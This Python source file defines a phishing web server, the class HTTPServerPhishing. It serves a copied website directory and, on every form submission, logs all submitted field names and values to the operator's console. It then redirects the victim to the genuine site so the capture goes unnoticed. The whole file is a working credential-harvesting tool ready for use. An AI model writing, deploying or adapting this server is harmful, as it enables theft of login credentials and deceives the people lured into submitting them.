from http.server import SimpleHTTPRequestHandler, HTTPServer
import cgi


class ServerHandler(SimpleHTTPRequestHandler):
    redirect_Original_website,redirect_Path = None,None

    def do_GET(self):
        self.log_message('',"Connected : %s" %(self.address_string()))
        if self.path =='/':self.path = self.redirect_Path
        if self.path.startswith('/'): self.path = self.redirect_Path + self.path
        SimpleHTTPRequestHandler.do_GET(self)

    def log_message(self, format, *args):
        return

    def redirect(self, page="/"):
        if not page.startswith('http://'):
            page = 'http://' + page
        self.send_response(301)
        self.send_header('Location', page)
        self.end_headers()

    def do_POST(self):
        redirect = False
        form = cgi.FieldStorage(
            fp=self.rfile,
            headers=self.headers,
            environ={'REQUEST_METHOD':'POST',
            'CONTENT_TYPE':self.headers['Content-Type'],
            }
        )
        if not form.list: return
        redirect = True
        for item in form.list:
            if item.name and item.value:
                self.log_message('',item.name+' : '+item.value)
        if redirect:
            self.redirect(self.redirect_Original_website)
        SimpleHTTPRequestHandler.do_GET(self)


class HTTPServerPhishing(object):
    def __init__(self,Address,PORT,redirect=None,directory=None):
        self.Address,self.PORT = Address,PORT
        self.Handler = ServerHandler
        self.Handler.redirect_Original_website = redirect
        self.Handler.redirect_Path = directory

    def Method_GET_LOG(self,format, *args):
        print(list(args)[0])
    
    def run(self):
        self.httpd = None
        self.httpd = HTTPServer((self.Address, self.PORT), self.Handler)
        self.Handler.log_message = self.Method_GET_LOG
        self.httpd.serve_forever()